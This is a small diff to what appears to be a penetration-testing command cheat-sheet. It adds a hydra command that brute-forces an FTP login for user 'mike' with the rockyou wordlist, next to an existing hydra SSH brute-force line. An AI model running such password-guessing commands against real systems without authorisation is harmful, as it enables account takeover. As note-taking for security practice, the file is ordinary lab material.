@@ -24,6 +24,7 @@ https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
 
 # password brute forcing -- ssh
 hydra -l ${HYDRA_USER} -P /usr/share/wordlists/rockyou.txt ssh://${TARGET_IP}
+hydra -t4 -l mike -P /usr/share/wordlists/rockyou.txt -vV $VULN_HOST ftp
 
 # only get headers
 curl -X GET --head http://${WEBSITE}
